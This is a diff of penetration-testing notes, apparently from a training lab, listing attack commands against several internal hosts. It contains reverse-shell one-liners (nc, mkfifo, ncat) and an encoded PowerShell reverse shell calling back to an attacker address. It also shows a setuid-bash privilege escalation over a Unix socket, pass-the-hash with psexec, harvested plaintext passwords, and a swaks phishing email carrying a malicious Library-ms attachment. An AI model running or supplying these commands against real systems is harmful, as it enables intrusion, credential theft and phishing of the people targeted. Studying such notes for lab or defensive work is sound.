@@ -490,6 +490,7 @@ ncat nc /bin/bash
 whoami
 ifconfig
 wget http://192.168.45.229/shell.php
+# shells https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 nc -e /bin/sh 192.168.45.229 1234
 nc -c bash 192.168.45.229 1234
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.229 1234 >/tmp/f
@@ -498,20 +499,36 @@ ncat 192.168.45.229 1234 -e /bin/bash
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-wget http://192.168.45.229/linpeas.sh -O linpeas.sh
 ```
+
 .12 privesc
 ```bash
-/var/lib/samba/usershares
-/usr/local/bin/filebrowser
-/var/crash
-/var/lib/BrlAPI
-/var/metrics
-/var/spool/samba
-/var/tmp
+wget http://192.168.45.229/linpeas.sh -O linpeas.sh
+/usr/sbin/CRON -f
+/bin/bash /root/.scripts/tmp_s.sh 
 
-/bin/bash /root/.scripts/tmp_s.sh
+echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/s
+
+# we should have found this connecting UNIX-CLIENT using pspy
+# connect to it to dump root password (BreakfastVikings999)
+nc -vlU /tmp/s
+
+grep --color=auto -rnw '/home/archive' -iIe "PASSWORD" --color=always 2>/dev/null
+grep --color=auto -rnw '/' -iIe "f.miller" --color=always 2>/dev/null
+
+summer12
+test:password123
+lance:circus5
+baop_user:CSHrckxgVskAuVEwB0gZ
+s.ahmed:WelcomeToSkyl4rk!
+
+Reimbursement Process:
+- List your expenses in an Excel document
+- Send it to f.miller@skylark.com
+- You'll get a decision in the next 3-5 days
+
 ```
+
 .13 - mail server use for phishing
 ```bash
 sudo nmap -p- -Pn 10.10.76.13 -sS -T 5 --verbose
@@ -520,6 +537,8 @@ crackmapexec winrm 10.10.76.13 -u backup_service -p It4Server --continue-on-succ
 impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76.13 
 
 crackmapexec smb 10.10.76.13 -u backup_service -p 'It4Server' -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.230.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
 .222
